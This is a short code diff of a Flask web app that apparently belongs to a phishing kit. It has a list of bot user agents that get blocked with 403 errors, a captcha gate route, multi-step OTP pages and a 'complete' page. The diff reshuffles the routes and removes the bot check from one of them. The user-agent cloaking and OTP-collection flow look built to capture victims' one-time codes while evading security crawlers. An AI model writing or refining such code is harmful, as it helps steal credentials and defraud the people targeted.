@@ -77,7 +77,7 @@ bot_user_agents = [
 "crawler"
 ]
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/m', methods=['GET', 'POST'])
 def captcha():
 
     if request.method == 'GET':
@@ -317,16 +317,8 @@ def otptwo():
     return render_template('otp2.html')
 
 
-@app.route("/cook", methods=['GET'])
+@app.route("/", methods=['GET'])
 def cook():
-    userip = request.headers.get("X-Forwarded-For")
-    useragent = request.headers.get("User-Agent")
-    
-    if useragent in bot_user_agents:
-        abort(403)  # forbidden
-    
-    if request.method == 'GET':
-        dman = session.get('ins')
     return render_template('complete.html')
 
 if __name__ == '__main__':
